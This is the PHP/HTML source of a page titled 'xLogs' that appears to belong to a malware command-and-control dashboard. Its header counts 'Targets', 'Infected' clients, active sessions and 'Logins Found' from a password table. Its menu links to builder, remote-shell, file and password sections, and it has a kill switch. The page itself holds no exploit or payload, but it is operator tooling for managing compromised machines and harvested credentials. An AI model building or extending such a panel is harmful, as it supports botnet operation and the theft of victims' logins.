<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>xLogs Page</title>
    <link rel="stylesheet" href="ystyles.css">
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="header">
        <div class="combined-header">
            <div class="horizontal-header">
                <div class="logo">
                    <img src="logo6.png" alt="Logo">
                </div>
                <div class="header-content">
		    <div class="online-count">
            	        <?php
			    $pdo = new PDO('mysql:host=localhost;dbname=clients', 'hunt3r', 'hunt3r');
        		    $stmt = $pdo->prepare('SELECT COUNT(*) FROM xclients');
        		    $stmt->execute();
        		    $totalClients = $stmt->fetchColumn();
        		    echo '<p><font color="white">Targets:</font></p>';
        		    echo '<div class="count"><font color="white">';
        		    echo $totalClients . '</font></div>';
        		?>
    		    </div>
    		    <div class="online-count">
            	        <?php
        		    $stmt = $pdo->prepare('SELECT COUNT(*) FROM xclients');
        		    $stmt->execute();
        		    $totalClients = $stmt->fetchColumn();
        		    echo '<p><font color="white">Infected:</font></p>';
        		    echo '<div class="count"><font color="white">';
        		    echo $totalClients . '</font></div>';
        	        ?>
    		    </div>
    	            <div class="online-count">
        		<?php
        		    $pdo = new PDO('mysql:host=localhost;dbname=clients', 'hunt3r', 'hunt3r');
        		    $stmt = $pdo->prepare('SELECT COUNT(*) FROM xclients WHERE status = "Online"');
        		    $stmt->execute();
        		    $onlineCount = $stmt->fetchColumn();
        		    echo '<p><font color="white">Clients Online:</font></p>';
        		    echo '<div class="count ';
      			    if ($onlineCount == 0) {
       		  	        echo 'red';
      		     	    } elseif ($onlineCount <= 3) {
       		    		echo 'yellow';
       		  	    } else {
         	   		 echo 'green';
        	  	    }
        	 	    echo '">' . $onlineCount . '</div>';
        		?>
    		    </div>
    		    <div class="online-count">
            		<?php
        		    $stmt = $pdo->prepare('SELECT COUNT(*) FROM xclients');
        		    $stmt->execute();
        		    $totalClients = $stmt->fetchColumn();
        		    echo '<p><font color="white">Active Sessions:</font></p>';
        		    echo '<div class="count"><font color="white">';
        		    echo $totalClients . '</font></div>';
        		?>
    		    </div>
		    <div class="online-count">
            		<?php
			    $pdo = new PDO('mysql:host=localhost;dbname=clients', 'hunt3r', 'hunt3r');
	            	    $stmt = $pdo->prepare('SELECT COUNT(*) FROM xpwd');
        		    $stmt->execute();
        		    $totalClients = $stmt->fetchColumn();
        		    echo '<p><font color="white">Logins Found:</font></p>';
        		    echo '<div class="count"><font color="white">';
        		    echo $totalClients . '</font></div>';
        	        ?>
    		    </div>
    	            <div class="online-count">
        		<?php
        		    $pdo = new PDO('mysql:host=localhost;dbname=team', 'hunt3r', 'hunt3r');
        		    $stmt = $pdo->prepare('SELECT COUNT(*) FROM member');
        		    $stmt->execute();
        		    $onlineCount = $stmt->fetchColumn();
        		    echo '<p><font color="white">Team Member:</font></p>';
        		    echo '<div class="count"><font color="white">';
        		    echo $onlineCount . '</font></div>';
        		?>
    		    </div>
    		    <div class="online-count">
            		<?php
        		    $stmt = $pdo->prepare('SELECT COUNT(*) FROM member WHERE zstatus = "online"');
        		    $stmt->execute();
        		    $totalClients = $stmt->fetchColumn();
        		    echo '<p><font color="white">Member Online:</font></p>';
        		    echo '<div class="count"><font color="white">';
        		    echo $totalClients . '</font></div>';
        		?>
    		    </div>
                </div>
                <div class="settings-button">
                    <button><img src="settings.png" alt="Settings" width="40" height="40"></button>
                </div>
            </div>
            <div class="vertical-header">
                <div class="menu">
    		    <ul>
        	    <li><a href="#"><div class="menu-item-box"><span class="menu-item-text">CONTROL</span></div></a></li>
       		    <li><a href="#"><div class="menu-item-box"><span class="menu-item-text">XBUILD</span></div></a></li>
        	    <li><a href="#"><div class="menu-item-box"><span class="menu-item-text">XSHELL</span></div></a></li>
       		    <li><a href="#"><div class="menu-item-box"><span class="menu-item-text">XFILE</span></div></a></li>
       		    <li><a href="#"><div class="menu-item-box"><span class="menu-item-text">XPASS</span></div></a></li>
        	    <li><a href="#"><div class="menu-item-box"><span class="menu-item-text">XLOGS</span></div></a></li>
       		    <li><a href="#"><div class="menu-item-box"><span class="menu-item-text">XTEAM</span></div></a></li>
       		    <li><a href="#"><div class="menu-item-box"><span class="menu-item-text">XCHAT</span></div></a></li>
    		    </ul>
	        </div>
                <div class="tabs">
    		    <p><font color="#ffffff"><b>SESSION TABS:</b></font></p><br>
   		    <?php
    	    	        $pdo = new PDO('mysql:host=localhost;dbname=session', 'hunt3r', 'hunt3r');
    	    	        $stmt = $pdo->query('SELECT sessionname, sessionstatus FROM xsession');

    	    	        while ($row = $stmt->fetch(PDO::FETCH_ASSOC)) {
                        $sessionName = $row['sessionname'];
                        $sessionStatus = $row['sessionstatus'];

                        if ($sessionStatus == 0) {
                            $color = '#ff0000'; // Rot
                        } elseif ($sessionStatus == 1) {
                            $color = '#ffff00'; // Gelb
                        } elseif ($sessionStatus == 2) {
                            $color = '#00ff00'; // Grün
                        } else {
                            $color = '#ffffff'; // Standardfarbe
                        }

                        echo '<p class="session"><font color="' . $color . '"><b>[-] ' . $sessionName . '</b></font></p><br>';
                        }
                    ?>
            </div>
            <div class="slider-container">
                <form id="profileForm">
	            <div class="timeinterval"><p><b>Time Interval:</b></p></div>
                        <div class="profile-buttons">
                            <button type="button" class="profile-button active" data-profile="Profil 1">Profile 1</button>
                            <button type="button" class="profile-button" data-profile="Profil 2">Profile 2</button>
                            <button type="button" class="profile-button" data-profile="Profil 3">Profile 3</button>
                        </div>
                    </form>
                </div>
                <div class="version">
		    <p>Version 1.0</p><br>
                    <button class="kill-switch">Kill Switch</button>
                </div>
            </div>
        </div>
    </div>
    <div class="main-content">
    	<div class="left-pane">
            <h2>XLogs</h2>
            <div class="xlogs">
    <div class="logs-container" id="logsContainer">
        <!-- Hier werden die Logs eingefügt -->
    </div>
    <div class="controls-container">
        <div class="search-bar">
            <input type="text" id="searchInput" placeholder="Suche...">
            <button id="searchButton"><img src="search-icon.png" alt="Search"></button>
        </div>
        <div class="navigation-buttons">
            <button id="prevButton"><img src="prev-icon.png" alt="Previous"></button>
            <button id="nextButton"><img src="next-icon.png" alt="Next"></button>
        </div>
    </div>
    </div>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="logs.js"></script>
        </div>
</body>
</html>
